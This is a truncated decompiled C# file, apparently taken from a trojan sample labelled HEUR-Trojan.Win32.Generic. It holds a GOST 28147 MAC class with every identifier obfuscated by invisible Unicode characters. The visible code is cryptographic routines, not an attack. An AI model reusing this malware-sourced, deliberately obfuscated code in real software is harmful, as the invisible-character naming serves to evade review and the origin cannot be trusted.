// Decompiled with JetBrains decompiler
// Type: ⁯‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮
// Assembly: ReadLineS0SAT, Version=2.0.8.1, Culture=neutral, PublicKeyToken=null
// MVID: 826822DE-6F21-4D67-9238-0DAF50EB618B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-9ec8f988ff41765b68c6a4d29d259fafb62e97ad2d3633c43fbe0ab0dd12518d.exe

using System;

public class \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮ : 
  \u206E‬‮‪⁯‏⁮⁯‬​⁭⁯‫⁭‪⁮⁪⁪‍⁫‭⁯‍⁯‎‍‬​‎⁪⁭‎⁭‪⁫⁭‫⁮‫⁬‮
{
  private const int \u200C‮‭‍‪⁭‌‬‍⁪⁯⁭⁭⁪‮⁪⁬‍⁭⁯⁭‪⁬‬⁪⁬‭​⁯‮⁭‍‫‮⁮‌‭‎‍⁫‮ = 8;
  private const int \u202D⁬‪‎​⁬‫‮⁫‫⁭‭‫‍‍‮‪⁭‭​​⁮‍‍⁬⁮​​⁪⁯‌⁫⁯‮⁮‍⁯⁮⁪‏‮ = 4;
  private int \u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮;
  private byte[] \u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮;
  private byte[] \u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮;
  private bool \u200D⁫‮‏⁮‮‎⁪‍‭‏‍⁬‌⁮⁬‎‪‬‮⁫‬⁫‌‬‭‪⁮‍‏⁫‍⁮​‫⁪⁯‪⁫⁯‮ = true;
  private int[] \u200C​⁬⁭‏⁫‬⁮‍‍​⁯‬‪‪‏‫​⁯‌⁭‭‬‎‮‮​‭‬‍​‏⁭‬‏‎⁪​⁭⁮‮;
  private byte[] \u200D‍‪‌‬⁭‫⁮⁭⁬‏‍‫⁭⁯‎​‌‭⁮⁪⁭‬‫‍⁬‭‫⁪‌‬⁬‎‪‮⁯​⁬‍‍‮;
  private byte[] \u202D‌‪‍‌‌‎​‍‎‫⁫‎‌‎‮‌‎‭‫⁪‮⁫‎‌⁭‬‭⁬‍‬‪‬‎‪⁯‮⁯‎‌‮ = new byte[128]
  {
    (byte) 9,
    (byte) 6,
    (byte) 3,
    (byte) 2,
    (byte) 8,
    (byte) 11,
    (byte) 1,
    (byte) 7,
    (byte) 10,
    (byte) 4,
    (byte) 14,
    (byte) 15,
    (byte) 12,
    (byte) 0,
    (byte) 13,
    (byte) 5,
    (byte) 3,
    (byte) 7,
    (byte) 14,
    (byte) 9,
    (byte) 8,
    (byte) 10,
    (byte) 15,
    (byte) 0,
    (byte) 5,
    (byte) 2,
    (byte) 6,
    (byte) 12,
    (byte) 11,
    (byte) 4,
    (byte) 13,
    (byte) 1,
    (byte) 14,
    (byte) 4,
    (byte) 6,
    (byte) 2,
    (byte) 11,
    (byte) 3,
    (byte) 13,
    (byte) 8,
    (byte) 12,
    (byte) 15,
    (byte) 5,
    (byte) 10,
    (byte) 0,
    (byte) 7,
    (byte) 1,
    (byte) 9,
    (byte) 14,
    (byte) 7,
    (byte) 10,
    (byte) 12,
    (byte) 13,
    (byte) 1,
    (byte) 3,
    (byte) 9,
    (byte) 0,
    (byte) 2,
    (byte) 11,
    (byte) 4,
    (byte) 15,
    (byte) 8,
    (byte) 5,
    (byte) 6,
    (byte) 11,
    (byte) 5,
    (byte) 1,
    (byte) 9,
    (byte) 8,
    (byte) 13,
    (byte) 15,
    (byte) 0,
    (byte) 14,
    (byte) 4,
    (byte) 2,
    (byte) 3,
    (byte) 12,
    (byte) 7,
    (byte) 10,
    (byte) 6,
    (byte) 3,
    (byte) 10,
    (byte) 13,
    (byte) 12,
    (byte) 1,
    (byte) 2,
    (byte) 0,
    (byte) 11,
    (byte) 7,
    (byte) 5,
    (byte) 9,
    (byte) 4,
    (byte) 8,
    (byte) 15,
    (byte) 14,
    (byte) 6,
    (byte) 1,
    (byte) 13,
    (byte) 2,
    (byte) 9,
    (byte) 7,
    (byte) 10,
    (byte) 6,
    (byte) 0,
    (byte) 8,
    (byte) 12,
    (byte) 4,
    (byte) 5,
    (byte) 15,
    (byte) 3,
    (byte) 11,
    (byte) 14,
    (byte) 11,
    (byte) 10,
    (byte) 15,
    (byte) 5,
    (byte) 0,
    (byte) 12,
    (byte) 14,
    (byte) 8,
    (byte) 6,
    (byte) 2,
    (byte) 3,
    (byte) 9,
    (byte) 1,
    (byte) 7,
    (byte) 13,
    (byte) 4
  };

  public \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮()
  {
    this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮ = new byte[8];
    this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮ = new byte[8];
    this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ = 0;
  }

  private static int[] \u206F‌‌‌‫‎‪⁪⁫‎⁪​‫‎⁪⁯⁪‮‎‪⁬‫‪‫⁫‎⁮‍⁫⁭‭⁮⁯⁫⁯⁭‎‪⁬‭‮(byte[] _param0)
  {
    if (_param0.Length != 32)
      throw new ArgumentException("Key length invalid. Key needs to be 32 byte - 256 bit!!!");
    int[] numArray = new int[8];
    for (int index = 0; index != 8; ++index)
      numArray[index] = \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u206F‬‎⁪⁮​‎⁬‬⁮​⁪‫⁬⁪⁪⁪⁪⁫⁭‭⁪⁬‬⁪⁫⁫‎⁬‪‎‎‏‭‏‌​‪‬‭‮(_param0, index * 4);
    return numArray;
  }

  public void \u206A⁭⁫‪‫‬⁪‎​⁯‎‪⁬⁭​‍⁪⁫‌⁪‫⁯​⁪⁫⁫‪‬⁬‏‫‮⁬‬⁭⁬⁫‍⁮‮(
    \u202B⁭⁮‬‎⁪‬⁪‬⁮⁪‮‬‍‎⁮‎⁫‎​‌⁫⁪‭‬‮‏‮​⁮‌‌‬‌⁯‮⁫‮‬⁫‮ _param1)
  {
    this.\u202C‬‎⁪​​‌‎‍⁯⁯​‮‪‮​⁭‬‭​⁮‬‍⁬⁬⁫‭​‎‌⁪⁬‬‮⁬⁫‮⁮‪‪‮();
    this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮ = new byte[8];
    this.\u200D‍‪‌‬⁭‫⁮⁭⁬‏‍‫⁭⁯‎​‌‭⁮⁪⁭‬‫‍⁬‭‫⁪‌‬⁬‎‪‮⁯​⁬‍‍‮ = (byte[]) null;
    switch (_param1)
    {
      case \u206A⁯⁫‫‍‮‎​⁮⁭‪‌‎‍⁯‌‏⁪‬‭‍‭⁭‬⁯⁬⁪⁭​⁯‍‫‍⁪‮⁫⁭‫‭‏‮ _:
        \u206A⁯⁫‫‍‮‎​⁮⁭‪‌‎‍⁯‌‏⁪‬‭‍‭⁭‬⁯⁬⁪⁭​⁯‍‫‍⁪‮⁫⁭‫‭‏‮ obj1 = (\u206A⁯⁫‫‍‮‎​⁮⁭‪‌‎‍⁯‌‏⁪‬‭‍‭⁭‬⁯⁬⁪⁭​⁯‍‫‍⁪‮⁫⁭‫‭‏‮) _param1;
        obj1.\u200B‎‬⁫‎‏⁯‏‪⁪⁮‪⁯⁫‮⁫‏‪‬⁪‪‬‬‭⁫‫‭‮​⁮‎‍‬⁭‍⁪‎‎⁫‎‮().CopyTo((Array) this.\u202D‌‪‍‌‌‎​‍‎‫⁫‎‌‎‮‌‎‭‫⁪‮⁫‎‌⁭‬‭⁬‍‬‪‬‎‪⁯‮⁯‎‌‮, 0);
        if (obj1.\u202C⁬⁮⁮‮⁮​‫⁪⁬⁬⁬​‎‍⁭⁫‍⁯‬⁪‬⁮⁪‬‬⁭⁭⁫⁫‏‭⁪‬​‮​‫‫⁫‮ == null)
          break;
        this.\u200C​⁬⁭‏⁫‬⁮‍‍​⁯‬‪‪‏‫​⁯‌⁭‭‬‎‮‮​‭‬‍​‏⁭‬‏‎⁪​⁭⁮‮ = \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u206F‌‌‌‫‎‪⁪⁫‎⁪​‫‎⁪⁯⁪‮‎‪⁬‫‪‫⁫‎⁮‍⁫⁭‭⁮⁯⁫⁯⁭‎‪⁬‭‮(((\u200C⁭‎‪‬⁪⁭⁮‌​⁯‫⁪⁭⁬⁭‌‎⁮⁮⁯⁯​‏‎⁮‌‬⁪⁭⁬​⁯‏⁪‌‮‍⁮‮) obj1.\u202C⁬⁮⁮‮⁮​‫⁪⁬⁬⁬​‎‍⁭⁫‍⁯‬⁪‬⁮⁪‬‬⁭⁭⁫⁫‏‭⁪‬​‮​‫‫⁫‮).\u202B‫⁬⁬⁮‍‏⁪‭‎⁪‏‬⁪​⁭‍⁮​​⁬‭‌‮‬‎‍⁭⁯‮⁫⁬⁯⁭​‪‬‍‎‭‮());
        break;
      case \u200C⁭‎‪‬⁪⁭⁮‌​⁯‫⁪⁭⁬⁭‌‎⁮⁮⁯⁯​‏‎⁮‌‬⁪⁭⁬​⁯‏⁪‌‮‍⁮‮ _:
        this.\u200C​⁬⁭‏⁫‬⁮‍‍​⁯‬‪‪‏‫​⁯‌⁭‭‬‎‮‮​‭‬‍​‏⁭‬‏‎⁪​⁭⁮‮ = \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u206F‌‌‌‫‎‪⁪⁫‎⁪​‫‎⁪⁯⁪‮‎‪⁬‫‪‫⁫‎⁮‍⁫⁭‭⁮⁯⁫⁯⁭‎‪⁬‭‮(((\u200C⁭‎‪‬⁪⁭⁮‌​⁯‫⁪⁭⁬⁭‌‎⁮⁮⁯⁯​‏‎⁮‌‬⁪⁭⁬​⁯‏⁪‌‮‍⁮‮) _param1).\u202B‫⁬⁬⁮‍‏⁪‭‎⁪‏‬⁪​⁭‍⁮​​⁬‭‌‮‬‎‍⁭⁯‮⁫⁬⁯⁭​‪‬‍‎‭‮());
        break;
      case \u200C⁯‭‏⁯‬‌‌‏​‌‫⁬‮⁮⁫‬⁬‮⁪‍​⁯‮⁭‏‫‪‍‬⁮​‬⁭⁯‍⁭‭‪⁬‮ _:
        \u200C⁯‭‏⁯‬‌‌‏​‌‫⁬‮⁮⁫‬⁬‮⁪‍​⁯‮⁭‏‫‪‍‬⁮​‬⁭⁯‍⁭‭‪⁬‮ obj2 = (\u200C⁯‭‏⁯‬‌‌‏​‌‫⁬‮⁮⁫‬⁬‮⁪‍​⁯‮⁭‏‫‪‍‬⁮​‬⁭⁯‍⁭‭‪⁬‮) _param1;
        this.\u200C​⁬⁭‏⁫‬⁮‍‍​⁯‬‪‪‏‫​⁯‌⁭‭‬‎‮‮​‭‬‍​‏⁭‬‏‎⁪​⁭⁮‮ = \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u206F‌‌‌‫‎‪⁪⁫‎⁪​‫‎⁪⁯⁪‮‎‪⁬‫‪‫⁫‎⁮‍⁫⁭‭⁮⁯⁫⁯⁭‎‪⁬‭‮(((\u200C⁭‎‪‬⁪⁭⁮‌​⁯‫⁪⁭⁬⁭‌‎⁮⁮⁯⁯​‏‎⁮‌‬⁪⁭⁬​⁯‏⁪‌‮‍⁮‮) obj2.\u202C⁬⁮⁮‮⁮​‫⁪⁬⁬⁬​‎‍⁭⁫‍⁯‬⁪‬⁮⁪‬‬⁭⁭⁫⁫‏‭⁪‬​‮​‫‫⁫‮).\u202B‫⁬⁬⁮‍‏⁪‭‎⁪‏‬⁪​⁭‍⁮​​⁬‭‌‮‬‎‍⁭⁯‮⁫⁬⁯⁭​‪‬‍‎‭‮());
        Array.Copy((Array) obj2.\u202A‌⁭‍‪‭‍‍⁪⁭⁫‮⁬‍⁪⁪‪⁬‏⁭⁫⁫⁬‫⁬‪‏⁯‍⁪‍‮‫⁪‏‬⁯‭‏‪‮(), 0, (Array) this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮, 0, this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮.Length);
        this.\u200D‍‪‌‬⁭‫⁮⁭⁬‏‍‫⁭⁯‎​‌‭⁮⁪⁭‬‫‍⁬‭‫⁪‌‬⁬‎‪‮⁯​⁬‍‍‮ = obj2.\u202A‌⁭‍‪‭‍‍⁪⁭⁫‮⁬‍⁪⁪‪⁬‏⁭⁫⁫⁬‫⁬‪‏⁯‍⁪‍‮‫⁪‏‬⁯‭‏‪‮();
        break;
      default:
        throw new ArgumentException("invalid parameter passed to Gost28147 init - " + \u206F‫‍⁮‍‏‭‌‫⁯‎‎​⁮‏⁮‎‮​⁭⁬⁬⁭‌‎‎‎‬⁯⁮‏⁮‭‎⁫⁯‭‌⁯‍‮.\u200B‮‬​‭‮⁪‫‫‍‌⁮‎‍‬‪‫⁬⁮​⁯⁭‎‫⁯‎⁭⁯‍‭‮⁫​‪‮‭⁪‭‫‭‮((object) _param1));
    }
  }

  public string \u206B‪⁭‪⁮‍⁮‪⁭⁪‪​⁮‭‭⁬⁯‍‎⁮⁬‫‍‏‌⁬⁯⁯‮⁪‪‬‫⁯‬⁪‌‍‮‎‮ => "Gost28147Mac";

  public int \u202D​⁮‍⁭⁫‍‌​‮⁫​​⁭⁯⁬⁪‫‬‭‪‫‭⁫⁬‫‭‬⁯‭⁮‎‍‫‌‎⁪⁭⁭‫‮() => 4;

  private int \u206D⁭‬⁪⁮​⁮⁭​‏‫‫⁮‬‬‎⁮⁪⁪⁮⁭‎‏‮‎‬‏​‬⁮‭⁯⁭‮‪​​‭‍‍‮(int _param1, int _param2)
  {
    int num1 = _param2 + _param1;
    int num2 = (int) this.\u202D‌‪‍‌‌‎​‍‎‫⁫‎‌‎‮‌‎‭‫⁪‮⁫‎‌⁭‬‭⁬‍‬‪‬‎‪⁯‮⁯‎‌‮[num1 & 15] + ((int) this.\u202D‌‪‍‌‌‎​‍‎‫⁫‎‌‎‮‌‎‭‫⁪‮⁫‎‌⁭‬‭⁬‍‬‪‬‎‪⁯‮⁯‎‌‮[16 + (num1 >> 4 & 15)] << 4) + ((int) this.\u202D‌‪‍‌‌‎​‍‎‫⁫‎‌‎‮‌‎‭‫⁪‮⁫‎‌⁭‬‭⁬‍‬‪‬‎‪⁯‮⁯‎‌‮[32 + (num1 >> 8 & 15)] << 8) + ((int) this.\u202D‌‪‍‌‌‎​‍‎‫⁫‎‌‎‮‌‎‭‫⁪‮⁫‎‌⁭‬‭⁬‍‬‪‬‎‪⁯‮⁯‎‌‮[48 + (num1 >> 12 & 15)] << 12) + ((int) this.\u202D‌‪‍‌‌‎​‍‎‫⁫‎‌‎‮‌‎‭‫⁪‮⁫‎‌⁭‬‭⁬‍‬‪‬‎‪⁯‮⁯‎‌‮[64 + (num1 >> 16 & 15)] << 16) + ((int) this.\u202D‌‪‍‌‌‎​‍‎‫⁫‎‌‎‮‌‎‭‫⁪‮⁫‎‌⁭‬‭⁬‍‬‪‬‎‪⁯‮⁯‎‌‮[80 + (num1 >> 20 & 15)] << 20) + ((int) this.\u202D‌‪‍‌‌‎​‍‎‫⁫‎‌‎‮‌‎‭‫⁪‮⁫‎‌⁭‬‭⁬‍‬‪‬‎‪⁯‮⁯‎‌‮[96 + (num1 >> 24 & 15)] << 24) + ((int) this.\u202D‌‪‍‌‌‎​‍‎‫⁫‎‌‎‮‌‎‭‫⁪‮⁫‎‌⁭‬‭⁬‍‬‪‬‎‪⁯‮⁯‎‌‮[112 + (num1 >> 28 & 15)] << 28);
    return num2 << 11 | (int) ((uint) num2 >> 21);
  }

  private void \u206A‏‌‍⁬‌‏‭⁯‮‭‎​‍⁪⁪​⁮​⁬‪‭⁯‮‮⁭‭⁭‫‪‎‎⁮‌⁭⁭⁮⁪⁬‌‮(
    int[] _param1,
    byte[] _param2,
    int _param3,
    byte[] _param4,
    int _param5)
  {
    int num1 = \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u206F‬‎⁪⁮​‎⁬‬⁮​⁪‫⁬⁪⁪⁪⁪⁫⁭‭⁪⁬‬⁪⁫⁫‎⁬‪‎‎‏‭‏‌​‪‬‭‮(_param2, _param3);
    int num2 = \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u206F‬‎⁪⁮​‎⁬‬⁮​⁪‫⁬⁪⁪⁪⁪⁫⁭‭⁪⁬‬⁪⁫⁫‎⁬‪‎‎‏‭‏‌​‪‬‭‮(_param2, _param3 + 4);
    for (int index1 = 0; index1 < 2; ++index1)
    {
      for (int index2 = 0; index2 < 8; ++index2)
      {
        int num3 = num1;
        num1 = num2 ^ this.\u206D⁭‬⁪⁮​⁮⁭​‏‫‫⁮‬‬‎⁮⁪⁪⁮⁭‎‏‮‎‬‏​‬⁮‭⁯⁭‮‪​​‭‍‍‮(num1, _param1[index2]);
        num2 = num3;
      }
    }
    \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u202B⁭‬‍‪⁪‏‎‪‭​⁬‎‏‭⁭‭‮⁪‏‭‪⁮‮‫‭⁮‌⁪⁬‮⁫‬‎‪⁫‪⁫⁮⁮‮(num1, _param4, _param5);
    \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u202B⁭‬‍‪⁪‏‎‪‭​⁬‎‏‭⁭‭‮⁪‏‭‪⁮‮‫‭⁮‌⁪⁬‮⁫‬‎‪⁫‪⁫⁮⁮‮(num2, _param4, _param5 + 4);
  }

  private static int \u206F‬‎⁪⁮​‎⁬‬⁮​⁪‫⁬⁪⁪⁪⁪⁫⁭‭⁪⁬‬⁪⁫⁫‎⁬‪‎‎‏‭‏‌​‪‬‭‮(byte[] _param0, int _param1) => (int) ((long) ((int) _param0[_param1 + 3] << 24) & 4278190080L) + ((int) _param0[_param1 + 2] << 16 & 16711680) + ((int) _param0[_param1 + 1] << 8 & 65280) + ((int) _param0[_param1] & (int) byte.MaxValue);

  private static void \u202B⁭‬‍‪⁪‏‎‪‭​⁬‎‏‭⁭‭‮⁪‏‭‪⁮‮‫‭⁮‌⁪⁬‮⁫‬‎‪⁫‪⁫⁮⁮‮(
    int _param0,
    byte[] _param1,
    int _param2)
  {
    _param1[_param2 + 3] = (byte) (_param0 >> 24);
    _param1[_param2 + 2] = (byte) (_param0 >> 16);
    _param1[_param2 + 1] = (byte) (_param0 >> 8);
    _param1[_param2] = (byte) _param0;
  }

  private static byte[] \u202D‍⁪⁮‪‍⁪​‍⁬⁮‬⁬⁭‍⁮⁫⁯‫⁫​‎‬⁭⁬⁫⁪⁪‪⁬‎⁯⁭‭⁯‫⁬‫‎‌‮(
    byte[] _param0,
    int _param1,
    byte[] _param2)
  {
    byte[] destinationArray = new byte[_param0.Length - _param1];
    Array.Copy((Array) _param0, _param1, (Array) destinationArray, 0, _param2.Length);
    for (int index = 0; index != _param2.Length; ++index)
      destinationArray[index] = (byte) ((uint) destinationArray[index] ^ (uint) _param2[index]);
    return destinationArray;
  }

  public void \u200E‍⁬‍‮‍⁮⁮​‭‪⁫‬⁭​⁯‭⁯‪‬⁮‬‏​⁪⁫‎‮​⁬⁮‪‎‮⁭​‏⁯‬⁮‮(byte _param1)
  {
    if (this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ == this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮.Length)
    {
      byte[] destinationArray = new byte[this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮.Length];
      Array.Copy((Array) this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, (Array) destinationArray, 0, this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮.Length);
      if (this.\u200D⁫‮‏⁮‮‎⁪‍‭‏‍⁬‌⁮⁬‎‪‬‮⁫‬⁫‌‬‭‪⁮‍‏⁫‍⁮​‫⁪⁯‪⁫⁯‮)
      {
        this.\u200D⁫‮‏⁮‮‎⁪‍‭‏‍⁬‌⁮⁬‎‪‬‮⁫‬⁫‌‬‭‪⁮‍‏⁫‍⁮​‫⁪⁯‪⁫⁯‮ = false;
        if (this.\u200D‍‪‌‬⁭‫⁮⁭⁬‏‍‫⁭⁯‎​‌‭⁮⁪⁭‬‫‍⁬‭‫⁪‌‬⁬‎‪‮⁯​⁬‍‍‮ != null)
          destinationArray = \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u202D‍⁪⁮‪‍⁪​‍⁬⁮‬⁬⁭‍⁮⁫⁯‫⁫​‎‬⁭⁬⁫⁪⁪‪⁬‎⁯⁭‭⁯‫⁬‫‎‌‮(this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, this.\u200D‍‪‌‬⁭‫⁮⁭⁬‏‍‫⁭⁯‎​‌‭⁮⁪⁭‬‫‍⁬‭‫⁪‌‬⁬‎‪‮⁯​⁬‍‍‮);
      }
      else
        destinationArray = \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u202D‍⁪⁮‪‍⁪​‍⁬⁮‬⁬⁭‍⁮⁫⁯‫⁫​‎‬⁭⁬⁫⁪⁪‪⁬‎⁯⁭‭⁯‫⁬‫‎‌‮(this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮);
      this.\u206A‏‌‍⁬‌‏‭⁯‮‭‎​‍⁪⁪​⁮​⁬‪‭⁯‮‮⁭‭⁭‫‪‎‎⁮‌⁭⁭⁮⁪⁬‌‮(this.\u200C​⁬⁭‏⁫‬⁮‍‍​⁯‬‪‪‏‫​⁯‌⁭‭‬‎‮‮​‭‬‍​‏⁭‬‏‎⁪​⁭⁮‮, destinationArray, 0, this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮, 0);
      this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ = 0;
    }
    this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮[this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮++] = _param1;
  }

  public void \u206F⁮⁪‎‭‍‎​‎⁬⁮‍‏⁫‭​‫⁬‌⁭​‏​‫‬⁯​⁫​⁬‎⁯⁫‮‍⁯‮‌⁪⁭‮(
    byte[] _param1,
    int _param2,
    int _param3)
  {
    if (_param3 < 0)
      throw new ArgumentException("Can't have a negative input length!");
    int length = 8 - this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮;
    if (_param3 > length)
    {
      Array.Copy((Array) _param1, _param2, (Array) this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮, length);
      byte[] destinationArray = new byte[this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮.Length];
      Array.Copy((Array) this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, (Array) destinationArray, 0, this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮.Length);
      if (this.\u200D⁫‮‏⁮‮‎⁪‍‭‏‍⁬‌⁮⁬‎‪‬‮⁫‬⁫‌‬‭‪⁮‍‏⁫‍⁮​‫⁪⁯‪⁫⁯‮)
      {
        this.\u200D⁫‮‏⁮‮‎⁪‍‭‏‍⁬‌⁮⁬‎‪‬‮⁫‬⁫‌‬‭‪⁮‍‏⁫‍⁮​‫⁪⁯‪⁫⁯‮ = false;
        if (this.\u200D‍‪‌‬⁭‫⁮⁭⁬‏‍‫⁭⁯‎​‌‭⁮⁪⁭‬‫‍⁬‭‫⁪‌‬⁬‎‪‮⁯​⁬‍‍‮ != null)
          destinationArray = \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u202D‍⁪⁮‪‍⁪​‍⁬⁮‬⁬⁭‍⁮⁫⁯‫⁫​‎‬⁭⁬⁫⁪⁪‪⁬‎⁯⁭‭⁯‫⁬‫‎‌‮(this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, this.\u200D‍‪‌‬⁭‫⁮⁭⁬‏‍‫⁭⁯‎​‌‭⁮⁪⁭‬‫‍⁬‭‫⁪‌‬⁬‎‪‮⁯​⁬‍‍‮);
      }
      else
